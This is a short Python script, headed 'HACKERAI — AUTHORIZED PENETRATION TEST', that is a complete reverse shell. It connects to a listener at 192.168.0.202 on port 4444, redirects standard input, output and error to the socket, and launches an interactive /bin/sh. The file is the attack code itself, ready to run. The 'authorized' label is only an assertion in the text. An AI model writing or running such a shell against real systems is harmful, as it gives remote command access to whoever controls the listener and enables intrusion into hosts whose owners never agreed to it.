#!/usr/bin/env python3
"""
HACKERAI — AUTHORIZED PENETRATION TEST
Python Reverse Shell
"""

import socket, subprocess, os, sys

LHOST = "192.168.0.202"
LPORT = 4444

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
except Exception as e:
    sys.exit(1)
